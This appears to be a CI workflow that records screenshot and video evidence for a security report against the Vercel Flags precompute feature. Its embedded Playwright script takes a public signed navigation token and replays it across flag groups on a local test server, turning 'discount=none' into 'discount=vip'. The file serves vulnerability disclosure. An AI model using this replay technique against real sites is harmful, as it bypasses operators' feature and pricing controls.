name: Vercel Flags visual replay evidence

on:
  push:
    branches:
      - h1-vercel-flags-precompute-context-replay
  workflow_dispatch:

jobs:
  visual-evidence:
    runs-on: ubuntu-latest
    env:
      FLAGS_SECRET: Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M
      NEXT_TELEMETRY_DISABLED: 1

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '22'

      - name: Install app and browser
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm install --no-audit --no-fund
          npm install --no-save playwright@1.55.0
          npx playwright install --with-deps chromium

      - name: Production build
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm run build

      - name: Start production server
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          npm run start > /tmp/next.log 2>&1 &
          echo $! > /tmp/next.pid
          for i in $(seq 1 30); do
            if curl --max-time 2 -fsS http://127.0.0.1:3000/ >/dev/null 2>&1; then
              exit 0
            fi
            sleep 1
          done
          cat /tmp/next.log
          exit 1

      - name: Record exploit and screenshots
        run: |
          cd security/vercel-flags-precompute-replay/e2e
          mkdir -p evidence/video
          cat > visual-evidence.mjs <<'NODE'
          import { chromium } from 'playwright';
          import fs from 'node:fs';

          const origin = 'http://127.0.0.1:3000';

          const rootResponse = await fetch(origin + '/');
          const rootHtml = await rootResponse.text();
          const matches = [...rootHtml.matchAll(/[A-Za-z0-9_-]+\.([A-Za-z0-9_-]*)\.[A-Za-z0-9_-]+/g)];
          if (!matches.length) throw new Error('Could not extract public signed root token');
          const rootCode = matches[0][0];

          const browser = await chromium.launch({ headless: true });
          const context = await browser.newContext({
            javaScriptEnabled: false,
            viewport: { width: 1280, height: 720 },
            recordVideo: { dir: 'evidence/video', size: { width: 1280, height: 720 } },
          });
          const page = await context.newPage();

          async function label(title, detail) {
            await page.addStyleTag({ content: `
              body { margin:0; min-height:100vh; background:#0b0d12; color:#f4f7fb;
                     font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
                     display:flex; align-items:center; justify-content:center; }
              main { font-size:42px; font-weight:800; padding:36px; border:2px solid #667085;
                     border-radius:18px; background:#151923; box-shadow:0 18px 70px #0008; }
              #evidence-banner { position:fixed; left:28px; right:28px; top:28px;
                     background:#1d2430; border:1px solid #667085; border-radius:14px;
                     padding:18px 22px; font-size:20px; line-height:1.45; }
              #evidence-url { position:fixed; left:28px; right:28px; bottom:28px;
                     background:#11151d; border:1px solid #475467; border-radius:12px;
                     padding:14px 18px; font-size:15px; overflow-wrap:anywhere; }
            `});
            await page.evaluate(({title, detail}) => {
              document.querySelector('#evidence-banner')?.remove();
              document.querySelector('#evidence-url')?.remove();
              const banner = document.createElement('div');
              banner.id = 'evidence-banner';
              banner.textContent = title + ' — ' + detail;
              document.body.appendChild(banner);
              const url = document.createElement('div');
              url.id = 'evidence-url';
              url.textContent = 'Live route: ' + location.href;
              document.body.appendChild(url);
            }, {title, detail});
          }

          await page.goto(origin + '/pricing', { waitUntil: 'load' });
          await label(
            'BASELINE',
            'Target group evaluates normally. discount decide() returns none.'
          );
          const baselineText = (await page.locator('main').innerText()).trim();
          if (!baselineText.includes('discount=none')) throw new Error('Baseline did not resolve discount=none');
          await page.screenshot({ path: 'evidence/01-baseline-discount-none.png', fullPage: true });
          await page.waitForTimeout(1800);

          const replayUrl = origin + '/' + rootCode + '/pricing/' + rootCode;
          await page.goto(replayUrl, { waitUntil: 'load' });
          await label(
            'CROSS-GROUP REPLAY',
            'The SAME signed navigation token is now supplied as both rootCode and pricingCode.'
          );
          const replayText = (await page.locator('main').innerText()).trim();
          if (!replayText.includes('discount=vip')) throw new Error('Replay did not resolve discount=vip');
          await page.screenshot({ path: 'evidence/02-replay-discount-vip.png', fullPage: true });
          await page.waitForTimeout(2500);

          fs.writeFileSync('evidence/evidence.txt',
            [
              'flags@4.3.1 / Next.js 16.3.6 / Node.js 22',
              'baseline=' + baselineText,
              'replay=' + replayText,
              'same_token_used_for_root_and_pricing=true',
              'token_modified=false',
              'cross_group_replay=PASS',
              'replay_url=' + replayUrl,
            ].join('\n') + '\n'
          );

          await context.close();
          await browser.close();
          NODE
          node visual-evidence.mjs

      - name: Upload visual evidence
        uses: actions/upload-artifact@v4
        with:
          name: vercel-flags-visual-evidence
          path: |
            security/vercel-flags-precompute-replay/e2e/evidence/**
          if-no-files-found: error
          retention-days: 7
